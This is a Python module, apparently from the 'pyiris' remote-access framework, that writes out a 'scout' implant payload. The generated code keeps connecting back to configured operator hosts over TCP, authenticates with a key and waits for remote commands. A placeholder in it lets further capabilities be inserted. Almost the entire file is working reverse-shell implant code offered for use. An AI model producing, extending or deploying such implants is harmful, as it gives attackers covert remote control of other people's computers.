# API
# done
import pyiris_api.library.modules.safe_open as safe_open
import os
from datetime import datetime


def main(self, option):
    if option == 'generate':
        host = self.config.scout_values['Host'][0]
        port = self.config.scout_values['Port'][0]
        key = self.config.key
        timeout = self.config.scout_values['Timeout'][0]
        self.config.local_time_dir = os.path.join(self.config.scout_values['Dir'][0], datetime.now().strftime("%Y-%m-%d_%H-%M-%S"))
        filepath = os.path.join(self.config.local_time_dir, 'payload.py')
        self.config.import_statements.append('import socket')
        self.config.import_statements.append('from os import _exit')
        self.config.import_statements.append('from time import sleep')
        with safe_open.main(filepath, 'w') as f:
            host = str(host.replace(' ','').split(','))
            f.write(f'''
def recv_all(sock):
    sock.settimeout(None)
    try:
        data = sock.recv(1000000)
        processed_data = data.decode()
        target_length = int(processed_data.split("|",1)[0]) 
        data = data[len(str(target_length))+1:] 
    except UnicodeDecodeError:
        target_length = int(data.decode(encoding='utf-8', errors='ignore').split("|",1)[0])
        data = data[len(str(target_length))+1:] 
    received_data_length = len(data) 
    if received_data_length >= target_length: 
        try:
            return data.decode()
        except UnicodeDecodeError:
            return data
    sock.settimeout(3) 
    while received_data_length < target_length: 
        try:
            tmp_data = sock.recv(1000000)
            if not tmp_data:
                raise socket.error
            data += tmp_data
            received_data_length += 1000000
        except (socket.error, socket.timeout):
            break
    try:
        return data.decode()
    except UnicodeDecodeError:
        return data
def send_all(sock, data):
    try:
        sock.sendall((str(len(data)) + "|" + data).encode())
    except TypeError:
        sock.sendall(str(len(data)).encode() + b"|" + data)
host_list = {host}
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                s = socket.socket()
                s.settimeout({timeout})
                s.connect((i,{port}))
                send_all(s,'{key}')
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            command = data.split(" ", 1)[0]
            if command == 'kill':
                send_all(s,'[*]Scout is killing itself...')
                _exit(1)
            elif command in ('help','?'):
                send_all(s, help_menu)
            elif command == 'loaded_components':
                send_all(s, pickle.dumps(comp_list))
            elif command == 'ping':
                send_all(s,'[+]Scout is alive')
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                send_all(s,'[*]Scout is sleeping...')
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                send_all(s,'[*]Scout is disconnecting itself...')
                sleep(3)
                break#Statements#
            else:
                send_all(s,'[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
        except (socket.error,socket.timeout,ConnectionResetError):
            try:
                if type(e) not in (socket.error,socket.timeout,ConnectionResetError):
                    raise e
                s.close()
                break
            except IndexError:
                send_all(s,'[-]Please supply valid arguments for the command you are running')
            except Exception as e:
                send_all(s,'[!]Error in scout : ' + str(e))
        except IndexError:
            send_all(s,'[-]Please supply valid arguments for the command you are running')
        except Exception as e:
            send_all(s,'[!]Error in scout : ' + str(e))''')
    elif option == 'info':
        self.log.blank('\nName             : Reverse TCP Base component' \
                       '\nOS               : Linux' \
                       '\nRequired Modules : socket, time' \
                       '\nCommands         : kill, ping, sleep <time>, disconnect' \
                       '\nDescription      : The base component of the scout, it allows it to connect back to the server and supports connection status commands' \
                       '\nConnection type  : Reverse\n')
        return {
                "Name": "Reverse TCP Base component",
                "OS": "Linux",
                "Required Modules": "socket, time",
                "Commands": "kill, ping, sleep <time>, disconnect",
                "Description": "The base component of the scout, it allows it to connect back to the server and supports connection status commands",
                "Connection Type": "Reverse"
            }